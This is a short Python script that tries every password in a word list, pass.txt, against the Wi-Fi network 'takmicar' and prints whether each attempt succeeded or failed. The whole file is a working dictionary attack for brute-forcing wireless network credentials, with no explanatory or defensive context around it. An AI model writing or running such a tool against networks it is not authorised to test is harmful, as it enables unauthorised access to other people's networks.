from wireless import Wireless

wire = Wireless()
with open('pass.txt', 'r') as file:
    for line in file.readlines():
        if wire.connect(ssid='takmicar', password=line.strip()) == True:
            print('[+]', line.strip(), '- Success!')
        else:
            print('[-]', line.strip(), '- Failed!')



